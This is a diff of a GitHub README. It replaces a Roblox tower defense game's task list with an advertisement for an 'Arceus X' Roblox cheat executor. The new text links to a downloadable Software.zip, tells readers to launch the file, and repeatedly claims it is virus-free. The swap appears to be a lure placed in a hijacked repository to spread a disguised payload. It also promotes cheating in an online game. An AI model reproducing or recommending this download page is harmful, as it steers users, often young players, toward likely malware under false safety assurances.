@@ -1,53 +1,30 @@
-# CWTD
-*Simple roblox Tower Defense game*
+# Arceus X Exploit & Executor
 
-### to do list:
-> * [x] Enemy movement
-> * [x] Wave system
-> * [x] Different enemy types
-> * [x] Simple tower
-> * [x] Damaging and killing enemies
-> * [x] Mouse raycasting, tower placement
-> * [x] Money system
-> * [x] Tower upgrade, priority, sell system
-> * [x] Mobile support
-> * [x] Animating GUI
-> * [x] Announcements if cannot afford upgrade
-> * [x] Add money income announcement
-> * [x] Sound effects for 'red' announcements
-> * [x] Improving enemy GUI (Health bar, Type info)
-> * [x] Fix enemy health bar position
-> * [x] Fix wrong owner displaying
-> * [x] Fix tower attack animation and the projectile
-> * [x] Make the projectiles faster
-> * [x] Change tower limit system
-> * [x] Add hitbox around a tower, animated circle
-> * [x] Make working damage counter
-> * [x] Add tower's damage and kill counter
-> * [x] Add number formating
-> * [x] Fix tower sell price
-> * [x] Fix tower attacking instantly after upgrade
-> * [x] Make a starting cash bonus for people that joined the group
-> * [x] Create lobby
-> * [x] Add gui in lobby
-> * [x] Add unit inventory system in lobby
-> * [ ] Add item inventory system in lobby
-> * [ ] Add summoning system
-> * [ ] Code the settings button in lobby
-> * [ ] Add story mode system
-> * [ ] Add infinity mode system
-> * [ ] Create more maps
-> * [ ] Make working reward system after game
-> * [ ] Add a scrap shop in lobby
-> * [ ] Code Next, Retry and Exit buttons on the EndScreen
-> * [ ] Create enemies models
-> * [ ] Create more towers
-> * [ ] Add damage indicator
-> * [ ] Add different AOE type attack mechanics with decal
-> * [ ] Add different DOT type attack mechanics (Bleed, Freeze, Stun, Slow)
-> * [ ] Add lobby rewards system (aka Battlepass)
-> * [ ] Add lobby level system
-> * [ ] Add quests system
-> * [ ] Add batallion mechanics
-> * [ ] Add evolve system 
-> * [ ] Add some Gamepasses
+🚀 Welcome to the Arceus X Exploit & Executor repository! 🎮
+
+This repository hosts the Arceus X Exploit & Executor, a cutting-edge cheating tool designed to enhance your gaming experience on the mobile version of Roblox for both Android and iOS devices. With the Arceus X Exploit & Executor, users can easily activate cheats, scripts, and hacks to gain an advantage in the game without any hidden charges or harmful viruses.
+
+## Features
+
+🔥 Here are some of the exciting features offered by Arceus X Exploit & Executor:
+
+- **Adaptive Cheat Options**: Pick from a diverse range of cheat options to tailor your gaming experience.
+- **Script Implementation**: Easily implement scripts to customize your gameplay without limitations.
+- **Secure and Virus-Free**: Rest assured that Arceus X is safe to use, with no harmful viruses to worry about.
+- **User-Friendly Interface**: Enjoy a smooth and intuitive user experience with our user-friendly interface.
+
+## Get Started
+
+Ready to elevate your Roblox gaming experience? Click the button below to download the Arceus X Exploit & Executor and unleash your full gaming potential!
+
+[![Download Arceus X](https://img.shields.io/static/v1?label=Download&message=Arceus%20X&color=blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+
+Please note that the downloaded file needs to be launched to start using Arceus X Exploit & Executor.
+
+## Feedback and Support
+
+We value your feedback and are here to help with any questions or concerns you may have. Feel free to reach out to us through the repository's "Issues" section for assistance.
+
+Thank you for choosing Arceus X Exploit & Executor. Enhance your gaming experience like never before! 🎉
+
+🎮 Happy cheating, and may the hacks be ever in your favor! 🚀
